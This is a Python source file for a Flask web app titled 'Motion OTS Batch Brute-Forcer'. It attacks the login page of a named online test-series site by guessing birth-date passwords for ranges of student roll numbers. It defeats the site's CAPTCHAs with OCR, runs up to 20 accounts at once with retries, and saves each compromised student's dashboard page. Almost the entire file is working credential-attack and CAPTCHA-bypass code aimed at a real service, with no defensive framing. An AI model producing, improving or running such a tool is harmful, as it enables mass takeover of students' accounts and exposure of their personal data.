#!/usr/bin/env python3
"""
Motion OTS Batch Brute‑Forcer – Reliable & Fast (3 retries per date)
Author: Potato (Speed Edition)

- 3 retries for every password attempt (fresh CAPTCHA each time)
- Pre‑fetched CAPTCHAs for zero idle time
- Tiny delay (0.2s) between dates – effectively ~1 attempt per second per user
- Batch up to 20 users simultaneously
- Smart success detection (no more missed passwords)
- Live logs and full DB persistence
"""

import os, sys, time, uuid, json, threading, queue, asyncio, aiohttp
from bs4 import BeautifulSoup
import re
from datetime import datetime, timedelta
import sqlite3, traceback
from flask import Flask, render_template_string, request, jsonify, g

# ----------------------------------------------------------------------
# CONFIGURATION
# ----------------------------------------------------------------------
DELAY_BETWEEN_ATTEMPTS = 0.2          # tiny breath between dates (0.1 if server tolerates)
MAX_RETRIES_PER_PASSWORD = 3          # you want 3
MAX_CONCURRENT_USERS = 20             # run up to 20 users in parallel
CAPTCHA_FETCH_TIMEOUT = 6
LOGIN_TIMEOUT = 10
POLLING_INTERVAL = 1.5
CAPTCHA_PREPROCESS = True

# ----------------------------------------------------------------------
# OCR SETUP
# ----------------------------------------------------------------------
try:
    import ddddocr
    ocr = ddddocr.DdddOcr(ocr=True, det=False)
    OCR_OK = True
    print("✅ ddddocr initialized")
except ImportError:
    OCR_OK = False
    print("❌ ddddocr not installed")
    sys.exit(1)

try:
    import pytesseract
    pytesseract.pytesseract.tesseract_cmd = '/usr/bin/tesseract'
    TESSERACT_OK = True
except:
    TESSERACT_OK = False

def preprocess_captcha_bytes(img_bytes):
    if not CAPTCHA_PREPROCESS:
        return img_bytes
    try:
        from PIL import Image, ImageEnhance
        from io import BytesIO
        img = Image.open(BytesIO(img_bytes)).convert('L')
        enhancer = ImageEnhance.Contrast(img)
        img = enhancer.enhance(2.0)
        buf = BytesIO()
        img.save(buf, format='PNG')
        return buf.getvalue()
    except:
        return img_bytes

def solve_captcha_image(img_bytes, log_queue=None):
    try:
        processed = preprocess_captcha_bytes(img_bytes)
        result = ocr.classification(processed)
        if result:
            cleaned = re.sub(r'[^A-Z0-9]', '', result).strip()
            if len(cleaned) >= 4:
                return cleaned[:6]
            if len(result) >= 4:
                return result[:6]
        if TESSERACT_OK:
            from PIL import Image
            from io import BytesIO
            img = Image.open(BytesIO(processed))
            img = img.point(lambda p: 0 if p < 140 else 255, '1')
            custom_config = r'--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
            text = pytesseract.image_to_string(img, config=custom_config)
            cleaned = re.sub(r'[^A-Z0-9]', '', text).strip()
            if len(cleaned) >= 4:
                return cleaned[:6]
        return None
    except Exception as e:
        if log_queue:
            log_queue.put_nowait(f"❌ OCR error: {str(e)}")
        return None

# ----------------------------------------------------------------------
# DATABASE
# ----------------------------------------------------------------------
DATABASE = 'brute_jobs.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

def init_db():
    with sqlite3.connect(DATABASE) as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS jobs (
                job_id TEXT PRIMARY KEY,
                user_ids TEXT NOT NULL,
                year INTEGER NOT NULL,
                status TEXT DEFAULT 'idle',
                results TEXT DEFAULT '{}',
                logs TEXT DEFAULT '[]',
                start_time TEXT,
                end_time TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()

# ----------------------------------------------------------------------
# JOB CLASS
# ----------------------------------------------------------------------
class BruteJob:
    def __init__(self, job_id, user_ids, year, status='idle', results=None, logs=None):
        self.job_id = job_id
        self.user_ids = user_ids
        self.year = year
        self.status = status
        self.results = results if results is not None else {}
        self.logs = logs if logs is not None else []
        self.start_time = None
        self.end_time = None
        self.thread = None
        self.stop_flag = False
        self.log_queue = queue.Queue()
        self.user_progress = {}

    @classmethod
    def from_db_row(cls, row):
        job = cls(
            row['job_id'],
            json.loads(row['user_ids']),
            row['year'],
            row['status'],
            json.loads(row['results']) if row['results'] else {},
            json.loads(row['logs']) if row['logs'] else []
        )
        job.start_time = row.get('start_time')
        job.end_time = row.get('end_time')
        return job

    def save_to_db(self):
        with sqlite3.connect(DATABASE) as conn:
            conn.execute('''
                INSERT OR REPLACE INTO jobs
                (job_id, user_ids, year, status, results, logs, start_time, end_time)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                self.job_id,
                json.dumps(self.user_ids),
                self.year,
                self.status,
                json.dumps(self.results),
                json.dumps(self.logs),
                self.start_time,
                self.end_time
            ))
            conn.commit()

    def start(self):
        if self.thread and self.thread.is_alive():
            return
        self.status = 'running'
        self.start_time = datetime.now().isoformat()
        self.logs = []
        self.results = {}
        self.stop_flag = False
        self.user_progress = {}
        self.save_to_db()
        self.thread = threading.Thread(target=self._run)
        self.thread.daemon = True
        self.thread.start()

    def _run(self):
        try:
            asyncio.run(self._async_batch())
        except Exception as e:
            self.log_queue.put(f"❌ Unhandled error: {traceback.format_exc()}")
        finally:
            if self.status not in ('success', 'failed', 'stopped'):
                if any(self.results.get(uid) for uid in self.user_ids):
                    self.status = 'success'
                else:
                    self.status = 'failed'
            self.end_time = datetime.now().isoformat()
            self.save_to_db()

    async def _async_batch(self):
        log_queue = self.log_queue
        year = self.year
        log_queue.put_nowait(f"🚀 Starting batch for {len(self.user_ids)} users over {year}")
        log_queue.put_nowait(f"⚡ 3 retries per date, {MAX_CONCURRENT_USERS} concurrent users, pre‑fetched CAPTCHAs")

        connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT_USERS * 2)
        timeout = aiohttp.ClientTimeout(total=20, connect=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            semaphore = asyncio.Semaphore(MAX_CONCURRENT_USERS)
            user_tasks = []
            for uid in self.user_ids:
                user_tasks.append(
                    self._bruteforce_one_user(session, uid, year, semaphore)
                )
            await asyncio.gather(*user_tasks, return_exceptions=True)

        found = sum(1 for v in self.results.values() if v)
        log_queue.put_nowait(f"🏁 Batch finished. Found passwords for {found}/{len(self.user_ids)} users.")

    async def _bruteforce_one_user(self, session, user_id, year, semaphore):
        async with semaphore:
            if self.stop_flag:
                return
            self.log_queue.put_nowait(f"👤 Starting user {user_id}")

            start_date = datetime(year, 1, 1)
            end_date = datetime(year, 12, 31)
            dates = [start_date + timedelta(days=i) for i in range((end_date - start_date).days + 1)]
            total = len(dates)
            self.user_progress[user_id] = {'processed': 0, 'total': total}

            # Pre‑fetch first CAPTCHA
            next_captcha = await self._fetch_captcha(session, self.log_queue)
            for i, date in enumerate(dates):
                if self.stop_flag:
                    break
                password = date.strftime("%d-%m-%Y")
                self.user_progress[user_id]['processed'] = i + 1

                # Use the pre‑fetched CAPTCHA, immediately fetch next one
                captcha = next_captcha
                fetch_task = asyncio.create_task(self._fetch_captcha(session, self.log_queue))

                captcha_display = captcha if captcha else "❌ NONE"
                self.log_queue.put_nowait(f"🔑 [{user_id}] Trying {password} with CAPTCHA {captcha_display}")

                if not captcha:
                    await asyncio.sleep(DELAY_BETWEEN_ATTEMPTS)
                    next_captcha = await fetch_task
                    continue

                # Attempt login with up to 3 retries (even for wrong passwords)
                success = False
                for attempt in range(MAX_RETRIES_PER_PASSWORD):
                    if self.stop_flag:
                        break
                    try:
                        success, reason = await self._try_login(
                            session, user_id, password, captcha, self.log_queue
                        )
                        if success:
                            self.log_queue.put_nowait(f"✅ [{user_id}] SUCCESS! Password = {password}")
                            self.results[user_id] = password
                            # Save dashboard
                            try:
                                dash = await session.get("https://onlinetestseries.motion.ac.in/dashboard/student-dashboard.php")
                                if dash.status == 200:
                                    with open(f"dashboard_{user_id}.html", "w") as f:
                                        f.write(await dash.text())
                            except:
                                pass
                            self.save_to_db()
                            fetch_task.cancel()
                            return

                        # Retry everything – even wrong passwords – as requested
                        self.log_queue.put_nowait(
                            f"🔄 [{user_id}] Retry {attempt+1}/{MAX_RETRIES_PER_PASSWORD} for {password} (reason: {reason[:80]})"
                        )
                        captcha = await self._fetch_captcha(session, self.log_queue)
                        if not captcha:
                            break
                        await asyncio.sleep(0.2)  # tiny breath between retries
                    except asyncio.TimeoutError:
                        self.log_queue.put_nowait(f"⏰ [{user_id}] Timeout – retry {attempt+1}")
                        captcha = await self._fetch_captcha(session, self.log_queue)
                        if not captcha:
                            break
                        await asyncio.sleep(0.2)
                    except Exception as e:
                        self.log_queue.put_nowait(f"❌ [{user_id}] Exception: {str(e)}")
                        break

                # Wait for the next CAPTCHA (already being fetched)
                await asyncio.sleep(DELAY_BETWEEN_ATTEMPTS)
                next_captcha = await fetch_task

            self.results[user_id] = None
            self.log_queue.put_nowait(f"❌ [{user_id}] No password found in {year}.")
            self.save_to_db()

    async def _fetch_captcha(self, session, log_queue):
        for attempt in range(3):
            try:
                rand = int(time.time() * 1000) + attempt + os.getpid()
                url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=CAPTCHA_FETCH_TIMEOUT)) as resp:
                    if resp.status == 200:
                        img_bytes = await resp.read()
                        if len(img_bytes) < 100:
                            await asyncio.sleep(0.2)
                            continue
                        loop = asyncio.get_running_loop()
                        captcha = await loop.run_in_executor(None, solve_captcha_image, img_bytes, log_queue)
                        if captcha:
                            return captcha
                    await asyncio.sleep(0.3)
            except asyncio.TimeoutError:
                pass
            except Exception as e:
                if log_queue:
                    log_queue.put_nowait(f"⚠️ CAPTCHA fetch error: {e}")
        return None

    async def _try_login(self, session, user_id, password, captcha, log_queue):
        """Smart success detection – won't miss correct passwords."""
        data = {
            "login_username": user_id,
            "login_password": password,
            "captcha": captcha,
            "login": ""
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
            "Referer": "https://onlinetestseries.motion.ac.in/",
        }
        try:
            async with session.post(
                "https://onlinetestseries.motion.ac.in/login.php",
                data=data,
                headers=headers,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=LOGIN_TIMEOUT)
            ) as resp:
                if resp.status == 302:
                    location = resp.headers.get("Location", "")
                    log_queue.put_nowait(f"🔍 [{user_id}] Redirect to: {location[:120]}")
                    # If redirect goes anywhere other than login/captcha/index, assume success
                    if not any(x in location for x in ["login.php", "captcha", "index.php"]):
                        # Optionally verify by fetching the redirect page
                        try:
                            async with session.get(location, allow_redirects=True,
                                                    timeout=aiohttp.ClientTimeout(total=5)) as dash_resp:
                                text = await dash_resp.text()
                                if "dashboard" in text.lower() or "logout" in text.lower():
                                    return True, None
                                else:
                                    log_queue.put_nowait(f"⚠️ [{user_id}] Redirect didn't contain dashboard – but still treating as potential success")
                                    return True, None  # Give benefit of doubt
                        except:
                            return True, None  # If can't fetch, still assume success
                    else:
                        return False, "redirect_failure"
                elif resp.status == 200:
                    text = await resp.text()
                    soup = BeautifulSoup(text, "html.parser")
                    err = soup.find("div", class_="alertmsg")
                    if err:
                        err_text = err.text.strip()
                        if "CAPTCHA" in err_text or "captcha" in err_text:
                            return False, "captcha_error"
                        else:
                            return False, err_text[:100]
                    else:
                        if "dashboard" in text.lower() or "logout" in text.lower():
                            return True, None
                        return False, "unknown_failure"
                else:
                    return False, f"HTTP {resp.status}"
        except asyncio.TimeoutError:
            return False, "timeout"
        except Exception as e:
            return False, f"Exception: {e}"

    def stop(self):
        self.stop_flag = True
        self.status = 'stopped'
        self.save_to_db()

    def get_updates(self):
        new_logs = []
        while not self.log_queue.empty():
            try:
                msg = self.log_queue.get_nowait()
                self.logs.append(msg)
                new_logs.append(msg)
                if len(self.logs) % 10 == 0:
                    self.save_to_db()
            except:
                break
        if new_logs:
            self.save_to_db()
        return new_logs


# ----------------------------------------------------------------------
# FLASK APP
# ----------------------------------------------------------------------
app = Flask(__name__)
app.secret_key = 'supersecretkey-change-this-in-production'
jobs = {}

def load_jobs_from_db():
    with sqlite3.connect(DATABASE) as conn:
        conn.row_factory = sqlite3.Row
        rows = conn.execute("SELECT * FROM jobs ORDER BY created_at DESC").fetchall()
        for row in rows:
            job = BruteJob.from_db_row(row)
            jobs[job.job_id] = job
    print(f"📂 Loaded {len(jobs)} jobs from database.")


@app.route('/')
def index():
    HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Motion Batch Brute‑Force – Ultra Fast</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
        .container { max-width: 1100px; margin: auto; }
        .card { background: #161b22; padding: 20px; border-radius: 12px; margin-bottom: 20px; }
        h1 { color: #58a6ff; }
        .form-group { margin: 15px 0; display: flex; gap: 15px; flex-wrap: wrap; align-items: center; }
        .form-group label { font-weight: bold; min-width: 80px; }
        .form-group input { padding: 10px; border-radius: 6px; border: none; background: #0d1117; color: #c9d1d9; flex: 1; min-width: 150px; }
        .btn { padding: 10px 25px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
        .btn-start { background: #238636; color: #fff; }
        .btn-stop { background: #da3633; color: #fff; }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .logs-box { background: #0d1117; padding: 15px; border-radius: 8px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 13px; white-space: pre-wrap; margin-top: 10px; }
        .log-entry { border-bottom: 1px solid #21262d; padding: 3px 0; }
        .success { color: #3fb950; }
        .error { color: #f85149; }
        .info { color: #58a6ff; }
        .status-bar { padding: 10px; background: #0d1117; border-radius: 6px; margin: 10px 0; }
        .job-list { margin-top: 20px; }
        .job-item { background: #0d1117; padding: 10px; border-radius: 6px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
        .job-status { font-weight: bold; }
        .job-status.running { color: #58a6ff; }
        .job-status.success { color: #3fb950; }
        .job-status.failed { color: #f85149; }
        .job-status.stopped { color: #d29922; }
        .help-text { color: #8b949e; font-size: 0.9em; margin-top: 5px; }
        .user-results span { margin-right: 10px; }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <h1>🚀 Motion OTS Batch Brute‑Forcer</h1>
        <p>Enter roll numbers (comma or range) and a year. 3 retries per date, 20 concurrent users.</p>
        <p class="help-text">⚡ Pre‑fetched CAPTCHAs, live logs, smart success detection.</p>
        <form id="bruteForm">
            <div class="form-group">
                <label for="user_ids">User IDs</label>
                <input type="text" id="user_ids" placeholder="e.g. 26173000001-26173000100" required>
            </div>
            <div class="form-group">
                <label for="year">Year</label>
                <input type="number" id="year" placeholder="e.g. 2009" min="1900" max="2100" required>
            </div>
            <div style="display: flex; gap: 15px; flex-wrap: wrap;">
                <button type="submit" class="btn btn-start" id="startBtn">▶ Start Batch</button>
                <button type="button" class="btn btn-stop" id="stopBtn" disabled>⏹ Stop</button>
            </div>
        </form>
        <div class="status-bar">
            <span id="status-text">Idle</span>
            <span id="password-result"></span>
        </div>
        <div id="logs" class="logs-box">Waiting for logs...</div>
    </div>
    <div class="card">
        <h2>📋 Job History (persists across refreshes)</h2>
        <div id="jobList" class="job-list"></div>
    </div>
</div>
<script>
    let jobId = null;
    let pollInterval = null;
    const logsDiv = document.getElementById('logs');
    const statusText = document.getElementById('status-text');
    const passwordResult = document.getElementById('password-result');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const jobListDiv = document.getElementById('jobList');

    function parseUserIds(raw) {
        const ids = new Set();
        const parts = raw.split(',');
        for (let part of parts) {
            part = part.trim();
            if (part.includes('-')) {
                const [start, end] = part.split('-').map(s => s.trim());
                const startNum = parseInt(start, 10);
                const endNum = parseInt(end, 10);
                if (!isNaN(startNum) && !isNaN(endNum) && startNum <= endNum) {
                    for (let i = startNum; i <= endNum; i++) ids.add(i.toString());
                }
            } else if (part) {
                ids.add(part);
            }
        }
        return Array.from(ids);
    }

    document.getElementById('bruteForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const rawIds = document.getElementById('user_ids').value.trim();
        const year = document.getElementById('year').value.trim();
        if (!rawIds || !year) return alert('Please fill all fields.');
        const user_ids = parseUserIds(rawIds);
        if (user_ids.length === 0) return alert('No valid IDs.');
        if (user_ids.length > 100) return alert('Max 100 IDs allowed.');
        startBtn.disabled = true;
        stopBtn.disabled = false;
        logsDiv.innerHTML = '';
        statusText.innerText = 'Starting...';
        passwordResult.innerText = '';
        const formData = new FormData();
        formData.append('user_ids', JSON.stringify(user_ids));
        formData.append('year', year);
        try {
            const resp = await fetch('/start', { method: 'POST', body: formData });
            const data = await resp.json();
            if (data.error) { alert(data.error); resetUI(); return; }
            jobId = data.job_id;
            statusText.innerText = 'Running...';
            if (pollInterval) clearInterval(pollInterval);
            pollInterval = setInterval(pollStatus, 1500);
            loadJobs();
        } catch (err) { alert('Error: ' + err.message); resetUI(); }
    });

    stopBtn.addEventListener('click', async () => {
        if (!jobId) return;
        try {
            await fetch(`/stop/${jobId}`, { method: 'POST' });
            statusText.innerText = 'Stopped';
            stopBtn.disabled = true;
            startBtn.disabled = false;
            clearInterval(pollInterval);
            loadJobs();
        } catch (err) { alert('Stop error: ' + err.message); }
    });

    async function pollStatus() {
        if (!jobId) return;
        try {
            const resp = await fetch(`/status/${jobId}`);
            const data = await resp.json();
            if (data.error) { clearInterval(pollInterval); resetUI(); return; }
            if (data.new_logs && data.new_logs.length > 0) {
                data.new_logs.forEach(msg => {
                    const div = document.createElement('div');
                    div.className = 'log-entry';
                    if (msg.includes('SUCCESS')) div.classList.add('success');
                    else if (msg.includes('❌')) div.classList.add('error');
                    else div.classList.add('info');
                    div.textContent = msg;
                    logsDiv.appendChild(div);
                    logsDiv.scrollTop = logsDiv.scrollHeight;
                });
            }
            if (data.status === 'success') {
                statusText.innerText = '✅ Completed';
                stopBtn.disabled = true; startBtn.disabled = false;
                clearInterval(pollInterval); loadJobs();
            } else if (data.status === 'failed') {
                statusText.innerText = '❌ No password found';
                stopBtn.disabled = true; startBtn.disabled = false;
                clearInterval(pollInterval); loadJobs();
            } else if (data.status === 'stopped') {
                statusText.innerText = '⏹ Stopped';
                stopBtn.disabled = true; startBtn.disabled = false;
                clearInterval(pollInterval); loadJobs();
            }
            if (data.results) {
                let res = 'Results: ';
                for (const uid in data.results) {
                    const pwd = data.results[uid];
                    res += `<span class="${pwd ? 'success' : 'error'}">${uid}: ${pwd || '❌'}</span> `;
                }
                passwordResult.innerHTML = res;
            }
        } catch (err) { console.error('Poll error:', err); }
    }

    async function loadJobs() {
        try {
            const resp = await fetch('/jobs');
            const data = await resp.json();
            if (data.jobs) {
                jobListDiv.innerHTML = data.jobs.map(j => `
                    <div class="job-item">
                        <div>
                            <strong>${j.user_ids_count} users</strong> (${j.year})
                            <span class="job-status ${j.status}">${j.status.toUpperCase()}</span>
                            <div class="user-results">
                                ${Object.entries(j.results || {}).map(([uid, pwd]) =>
                                    `<span class="${pwd ? 'success' : 'error'}">${uid}: ${pwd || '❌'}</span>`
                                ).join('')}
                            </div>
                            <small style="color:#8b949e;">${j.created_at}</small>
                        </div>
                        <div>
                            <a onclick="viewJob('${j.job_id}')">Logs</a>
                            ${j.status === 'running' ? `<a onclick="stopJob('${j.job_id}')">Stop</a>` : ''}
                        </div>
                    </div>
                `).join('');
            }
        } catch (err) { console.error(err); }
    }

    async function viewJob(jid) {
        const resp = await fetch(`/status/${jid}`);
        const data = await resp.json();
        if (data.logs) {
            logsDiv.innerHTML = data.logs.map(msg => `<div class="log-entry">${msg}</div>`).join('');
            statusText.innerText = `Job ${jid} (${data.status})`;
            passwordResult.innerHTML = data.results ? Object.entries(data.results).map(([u,p])=>`<span class="${p?'success':'error'}">${u}: ${p||'❌'}</span>`).join(' ') : '';
        }
    }

    async function stopJob(jid) {
        if (!confirm('Stop this job?')) return;
        await fetch(`/stop/${jid}`, { method: 'POST' });
        loadJobs();
    }

    function resetUI() {
        startBtn.disabled = false;
        stopBtn.disabled = true;
        if (pollInterval) clearInterval(pollInterval);
        jobId = null;
    }
    loadJobs();
</script>
</body>
</html>
    '''
    return render_template_string(HTML)


@app.route('/start', methods=['POST'])
def start_job():
    user_ids_json = request.form.get('user_ids')
    year = request.form.get('year')
    if not user_ids_json or not year:
        return jsonify({'error': 'Missing user_ids or year'}), 400
    try:
        user_ids = json.loads(user_ids_json)
        if not isinstance(user_ids, list) or not all(isinstance(u, str) for u in user_ids):
            raise ValueError
    except:
        return jsonify({'error': 'Invalid user_ids format'}), 400
    try:
        year = int(year)
    except:
        return jsonify({'error': 'Year must be integer'}), 400
    if len(user_ids) > 100:
        return jsonify({'error': 'Maximum 100 user IDs allowed'}), 400

    job_id = str(uuid.uuid4())
    job = BruteJob(job_id, user_ids, year)
    jobs[job_id] = job
    job.save_to_db()
    job.start()
    return jsonify({'job_id': job_id})


@app.route('/status/<job_id>')
def status(job_id):
    job = jobs.get(job_id)
    if not job:
        return jsonify({'error': 'Job not found'}), 404
    new_logs = job.get_updates()
    return jsonify({
        'status': job.status,
        'results': job.results,
        'logs': job.logs,
        'new_logs': new_logs,
    })


@app.route('/stop/<job_id>', methods=['POST'])
def stop_job(job_id):
    job = jobs.get(job_id)
    if not job:
        return jsonify({'error': 'Job not found'}), 404
    job.stop()
    return jsonify({'status': 'stopped'})


@app.route('/jobs')
def list_jobs():
    with sqlite3.connect(DATABASE) as conn:
        conn.row_factory = sqlite3.Row
        rows = conn.execute("SELECT job_id, user_ids, year, status, results, created_at FROM jobs ORDER BY created_at DESC").fetchall()
        jobs_list = []
        for row in rows:
            d = dict(row)
            d['user_ids_count'] = len(json.loads(d['user_ids']))
            d['results'] = json.loads(d['results']) if d['results'] else {}
            jobs_list.append(d)
        return jsonify({'jobs': jobs_list})


@app.teardown_appcontext
def close_db(exception):
    db = getattr(g, '_database', None)
    if db:
        db.close()


if __name__ == '__main__':
    init_db()
    load_jobs_from_db()
    app.run(debug=False, host='0.0.0.0', port=5000)
else:
    init_db()
    load_jobs_from_db()
